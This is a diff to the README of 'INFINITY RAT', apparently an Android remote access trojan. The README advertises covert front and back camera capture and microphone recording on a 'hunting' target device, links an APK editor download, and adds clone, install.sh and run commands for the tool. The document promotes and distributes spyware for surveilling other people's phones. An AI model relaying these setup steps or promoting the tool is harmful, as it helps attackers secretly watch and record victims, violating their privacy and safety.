@@ -1,13 +1,13 @@
 # INFINITY RAT
 ## Application
-- [INFINITY RAT](https://)
-- [ADMIN PANEL](https://)
-- [APK EDITOR](https://)
+- 𝙰𝙳𝙼𝙸𝙽 𝙿𝙰𝙽𝙴𝙻[➱](https://)
+- 𝙸𝙽𝙵𝙸𝙽𝙸𝚃𝚈 𝚁𝙰𝚃 [➱](https://)
+- 𝙰𝙿𝙺 𝙴𝙳𝙸𝚃𝙾𝚁[➱](https://github.com/infinitynetwork13/INFINITY-RAT/raw/main/APP/APK_Editor.apk)
 ## 𝗧𝗲𝗿𝗺𝘀 𝗼𝗳 𝗨𝘀𝗲
 
 ʏᴏᴜʀ ʜᴜɴᴛɪɴɢ ᴅᴇᴠɪᴄᴇ ᴡɪᴛʜ ᴛʜɪs ᴀᴘᴘ
 
-```
+```python
  ●𝙵𝚘𝚗𝚝 𝙲𝚊𝚖𝚎𝚛𝚊
  ●𝙱𝚊𝚌𝚔 𝙲𝚊𝚖𝚎𝚛𝚊
  ●𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚁𝚎𝚌𝚘𝚛𝚍 
@@ -47,6 +47,12 @@ apt-get install python -y
 apt-get install git -y
 apt-get install nodejs -y
 pip install requests
-
+git clone https://github.com/infinitynetwork13/INFINITY-RAT.git
+cd INFINITY-RAT
+bash install.sh
 ```
-
+## OTHER TIME RUN
+```bash
+cd INFINITY-RAT
+python infinity.py
+```
